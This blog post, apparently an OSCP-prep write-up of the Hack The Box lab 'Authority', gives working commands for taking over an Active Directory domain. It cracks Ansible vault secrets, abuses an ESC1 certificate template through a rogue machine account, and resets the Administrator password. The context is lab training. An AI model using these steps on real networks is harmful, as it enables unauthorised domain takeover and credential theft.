---
layout: post
title: "authority"
date: 2025-12-02 
categories: OSCP Playlist
---
# authority

# Summary

- smb guest authentication to enumerate share permissions
- smbclient on Development shares; download all files
- opened directory in vscode for easier view; found ansible password hashes in PWM/defaults/main.yml
- convert ansible password hashes to ansible2john, cracked the master password with john
- cracked ansible password hashes with ansible-vault decrypt
- logged on to pwm web portal on port 8443; downloaded PwmConfiguration.xml; reveal password hash; LLM cracked password
- got valid credential svc_ldap; rusthound-ce to map out permissions
- cetipy-ad to find vulnerable templates; domain computers has enrollment rights on corpVPN template; vulnerable to ESC1; svc_ldap has add computer rights
- use impacket-addcomputer to create computer; use computer to get adminstrator.pfx; certipy-ad auth with -ldap-shell to get ldap shell
- changed administrator password; logged on with evil-winrm

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/authority 10.129.229.56

53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 20:43:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-01-02T20:44:27+00:00; +4h00m04s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-01-02T20:44:27+00:00; +4h00m04s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-02T20:44:27+00:00; +4h00m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-02T20:44:27+00:00; +4h00m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp open  ssl/http      Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-12-31T20:36:19
|_Not valid after:  2028-01-03T08:14:43
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-02T20:44:21
|_  start_date: N/A
|_clock-skew: mean: 4h00m03s, deviation: 0s, median: 4h00m03s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.80 seconds
```

We get the hostname and domain name:

```bash
10.129.229.56 authority authority.htb.corp
```

From the open ports and services, the machine seems like DC. Let’s visit the tomcat application:

```bash
https://10.129.229.56:8443
```

![image.png]({{ site.baseurl }}/assets/authroity/image.png)

We get the version of the application as well:

![image.png]({{ site.baseurl }}/assets/authroity/image%201.png)

PWM v2.0.3. Let’s search up exploits associated with this version. We do not find anything interesting. Let’s move on for now. 

Let’s try null authentication onto RPC:

```bash
rpcclient -U '' 10.129.229.56 -N
```

We are logged on. Let’s try enumerating all users:

```bash
rpcclient $> enumdomusers

do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED

```

Rejected. 

Let’s enumerate the smb share:

```bash
┌──(kali㉿kali)-[~/htb-labs/authority]
└─$ nxc smb authority -u '' -p '' --shares
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signi
ng:True) (SMBv1:False)  
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\: 
SMB         10.129.229.56   445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                               
┌──(kali㉿kali)-[~/htb-labs/authority]
└─$ nxc smb authority -u 'random' -p ''  --shares 
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\random: (Guest)
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares                 
SMB         10.129.229.56   445    AUTHORITY        Development     READ            
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share 
```

Null authentication failed, but when we input a random user name, nxc tries guest authentication, which lets us in. Another weird thing is, according to nxc, the hostname of the machine is authority, and the domain name is authority.htb. Let’s add those into our /etc/hosts file as well.

The interesting non-default share is Development. Let’s see what’s in the share:

```bash
nxc smb authority -u 'random' -p '' --spider Development --regex . 
```

From the list, the PWM directory seems the most interesting since we know there is a web app there. 

Let’s sign in with smbclient:

```bash
smbclient '//10.129.229.56/Development' -U random%''

cd Automation/Ansible/PWM
```

There are too many files, let’s download everything from smbclient:

```bash
RECURSE on
prompt
mget *
```

Now let’s navigate to Automation/Ansible then open it the dir in vscode:

```bash
cd smb/Automation/Ansible

code .
```

Looking through the PWM dir, we find the following credentials:

![image.png]({{ site.baseurl }}/assets/authroity/image%202.png)

Let’s try to login back on the website:

![image.png]({{ site.baseurl }}/assets/authroity/image%203.png)

It failed. 

In the [README.md](http://README.md), we also find: 

![image.png]({{ site.baseurl }}/assets/authroity/image%204.png)

Let’s try the suggested login:

```bash
root:password
```

![image.png]({{ site.baseurl }}/assets/authroity/image%205.png)

Using manspider to search for other password strings, we find the following:

```bash
┌──(kali㉿kali)-[~/…/authority/smb/Automation/Ansible]               
└─$ manspider . -c password vault pass
<SNIP>
[+] PWM/templates/tomcat-users.xml.j2: matched "password" 2 times                                                                              
[+] <user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>                                                                     [+] ca_passphrase: SuP3rS3creT     
[+] <user username="robot" password="T0mc@tR00t" roles="manager-script"/>   
```

We also find a suspicious file in PWM/defaults/main.yml

```bash
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

Let’s try decrypting :

```bash
cat hash.txt| ansible-vault decrypt

#we tried all the passwords we discovered, none worked.
```

Let’s convert the passwords to john:

```bash
ansible2john pwm_admin_login.txt pwm_admin_password.txt ldap_admin_password.txt > ansible.hashes
```

Now let’s attempt to decrypt it with john and rockyou.txt:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ansible.hashes

!@#$%^&*         (pwm_admin_password.txt)     
!@#$%^&*         (pwm_admin_login.txt)     
!@#$%^&*         (ldap_admin_password.txt) 
```

We have the password to the vault, now let’s decrypt:

```bash
cat pwm_admin_login.txt| ansible-vault decrypt

Vault password: 
Decryption successful
svc_pwm  

cat pwm_admin_password.txt| ansible-vault decrypt

Vault password: 
Decryption successful
pWm_@dm!N_!23 

cat ldap_admin_password.txt| ansible-vault decrypt

Vault password: 
Decryption successful
DevT3st@123
```

The middle password seems the most legitimate, let’s try using that login the Configuration Manager:

![image.png]({{ site.baseurl }}/assets/authroity/image%206.png)

Let’s download the configuration as well and see if we can recover any password:

```bash
PwmConfiguration.xml:

<SNIP>
        </setting>
        <setting key="ldap.proxy.password" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password</label>
            <value>ENC-PW:FL9mEuhCmpXFgz9Gyqpwvb318o6DLq4u7tMTcveTbPrs+gDejLmlbyoMMJSrIASjTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=</value>
        </setting>
        <setting key="ldap.proxy.username" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User</label>
            <value>CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</value>
        </setting>
        <setting key="ldap.search.timeoutSeconds" profile="default" syntax="DURATION" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Search Timeout</label>
            <default/>
        </setting>
        <setting key="ldap.testuser.username" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Test User</label>
```

Let’s just input the password into an LLM and attempt decryption. We get the following output:

```bash
lDaP_1n_th3_cle4r!
```

Now let’s test if this is a valid password for user svc_ldap:

```bash
nxc smb authority -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --shares

SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares READ            
SMB         10.129.229.56   445    AUTHORITY        Development     READ            
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON        READ            Logon server share 
SMB         10.129.229.56   445    AUTHORITY        SYSVOL          READ            Logon server share 
```

We have a valid user account now. We enumerate Department Shares and there are no files inside:

```bash
nxc smb authority -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --spider 'Department Shares' --regex .

```

Let’s use rusthound to map out the AD:

```bash
rusthound-ce -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -d authority.htb --ldaps
```

We use —ldaps option because the server requires it; without it, we get this error:

```bash
[2026-01-11T15:50:46Z INFO  rusthound_ce] Verbosity level: Info                                                                                
[2026-01-11T15:50:46Z INFO  rusthound_ce] Collection method: All                                                                               
[2026-01-11T15:50:46Z ERROR rusthound_ce::ldap] Failed to authenticate to AUTHORITY.HTB Active Directory. Reason: LDAP operation result: rc=8 (
strongerAuthRequired), dn: "", text: "00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL
\TLS are not already active on the connection, data 0, v4563" 
```

Let’s get a users list as well:

```bash
nxc smb authority -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --users

SMB         10.129.229.56   445    AUTHORITY        Administrator                 2023-07-05 14:35:34 0       Built-in account for administering the computer/domain
SMB         10.129.229.56   445    AUTHORITY        Guest                         2023-03-17 13:22:56 0       Built-in account for guest access to the computer/domain
SMB         10.129.229.56   445    AUTHORITY        krbtgt                        2022-08-09 22:54:01 0       Key Distribution Center Service Account
SMB         10.129.229.56   445    AUTHORITY        svc_ldap                      2022-08-11 01:29:31 0 
```

There are only 4 users.

Going back to bloodhound, we check our privileges:

![image.png]({{ site.baseurl }}/assets/authroity/image%207.png)

We are part of Remote Management users, which mean we can winrm onto the DC.

Bloodhound has shown we might have certificates enrollment rights:

![image.png]({{ site.baseurl }}/assets/authroity/image%208.png)

Let’s check with certipy for vulnerable templates.

```bash
certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -stdout -vuln

<SNIP>
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

ESC1 vulnerability. Searching up ESC1, we come across this post:

https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

![image.png]({{ site.baseurl }}/assets/authroity/image%209.png)

In the enrollment rights, even though we don’t see authenticated users being having the rights to enroll, we see that domain computers are allowed to enroll to this certificate template.

Let’s logon via evil-winrm:

```bash
evil-winrm -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -i authority
```

Let’s check our permissions:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

We have SeMachineAccountPrivilege, which means we can add a domain computer. Let’s create a fake computer so that we can enroll and exploit ESC1. 

```bash
impacket-addcomputer -dc-ip 10.129.229.56 -computer-name fakeComputer -computer-pass 'Super5ecret!' 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'

[*] Successfully added machine account fakeComputer$ with password Super5ecret!.

```

Let’s craft our attack:

```bash
certipy-ad req -u 'fakeComputer$' -p 'Super5ecret!' -dc-ip 10.129.229.56 -target 'authority.authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn administrator@authority.htb

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Now let’s use this ticket to get the administrator’s nt hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 
```

Failed. 

Researching more about ESC1, it seems we also need the user’s SID. 

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

It seems we might’ve need the SID as well. To get the SID, we can use nxc:

```bash
nxc ldap authority -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --get-sid

LDAPS       10.129.229.56   636    AUTHORITY        Domain SID S-1-5-21-622327497-3269355298-2248959698

```

Default administrator RID would be 500. Let’s craft our attack once more

```bash
certipy-ad req -u 'fakeComputer$' -p 'Super5ecret!' -dc-ip 10.129.229.56 -target 'authority.authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn administrator@authority.htb -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
```

Now let’s try again:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56

Certipy v5.0.3 - by Oliver Lyak (ly4k)
                                   
[*] Certificate identities:                                            
[*]     SAN UPN: 'administrator@authority.htb'                                                                                                 
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'                                                                            
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Using principal: 'administrator@authority.htb'                     
[*] Trying to get TGT...                                               
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace                                 
[-] See the wiki for more information  
```

Same error. Searching up the error, it seems that the DC does not allow pkinit. Let’s just get a ldap-shell:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
Type help for list of commands

# whoami
u:HTB\Administrator

# 

```

We are administrator

We can either try changing the administrator’s password or just add our svc_ldap user to Domain Admins group.

```bash
# change_password Administrator 'P@assword123'

Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
Attempting to set new password of: P@assword123
Password changed successfully!
```

Now let’s attempt to evil-winrm onto the machine:

```bash
evil-winrm -i authority -u Administrator -p 'P@assword123'
```

![image.png]({{ site.baseurl }}/assets/authroity/image%2010.png)

We are now administrator.